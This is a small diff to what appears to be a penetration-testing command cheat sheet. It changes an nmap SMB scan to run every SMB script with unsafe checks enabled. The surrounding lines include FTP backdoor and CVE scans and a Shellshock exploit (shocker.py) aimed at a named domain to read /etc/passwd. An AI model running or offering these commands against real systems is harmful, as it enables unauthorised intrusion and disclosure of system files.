@@ -58,7 +58,7 @@ Burp Suite + Vega + Zaproxy + Nikto (B=<domain/ip>;nikto -h $B -p 80,443 -o nikt
 **TODO**
 ```
 nmap -vv --script http-methods <target>
-nmap -vv -p 445 --script=smb-check-vulns --script-args=unsafe=1 <target>
+nmap -vv -p 445 --script=smb-* --script-args=unsafe=1 <target>
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <target>
 python2 shocker.py -H southtelecom.vn --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
 curl -s -D- <url> | grep -i strict
